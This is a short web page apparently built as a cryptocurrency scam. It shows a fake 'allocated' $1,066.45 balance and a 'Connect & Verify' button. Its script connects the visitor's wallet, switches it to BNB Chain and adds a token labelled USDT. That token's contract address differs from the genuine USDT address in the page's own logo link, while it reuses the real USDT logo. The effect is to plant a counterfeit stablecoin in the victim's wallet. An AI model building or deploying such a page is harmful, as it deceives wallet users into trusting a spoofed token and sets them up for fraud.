<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Node</title>
    <style>
        body { background: #0b0e11; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .btn { background: #f3ba2f; color: black; border: none; padding: 20px 40px; border-radius: 10px; font-weight: bold; font-size: 18px; width: 80%; cursor: pointer; }
        .bal { font-size: 35px; margin: 20px 0; font-weight: bold; }
    </style>
</head>
<body>
    <div style="color: #848e9c;">ALLOCATED VALUE</div>
    <div class="bal">$1,066.45</div>
    
    <button class="btn" onclick="sync()">CONNECT & VERIFY</button>
    
    <p id="status" style="font-size: 12px; color: #848e9c; margin-top: 20px;">Ready...</p>

<script>
    async function sync() {
        const s = document.getElementById('status');
        // Direct Provider Check
        const p = window.ethereum || window.BinanceChain;

        if (!p) { alert("Open in Binance Web3 Wallet"); return; }

        try {
            s.innerText = "Connecting...";
            await p.request({ method: 'eth_requestAccounts' });

            s.innerText = "Switching Network...";
            await p.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }]
            });

            s.innerText = "Injecting Asset...";
            // High-Resolution Direct Link for Logo
            await p.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
                        symbol: "USDT",
                        decimals: 6,
                        image: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png"
                    }
                }
            });
            s.innerText = "Success!";
        } catch (e) {
            s.innerText = "Error. Try again.";
        }
    }
</script>
</body>
</html>
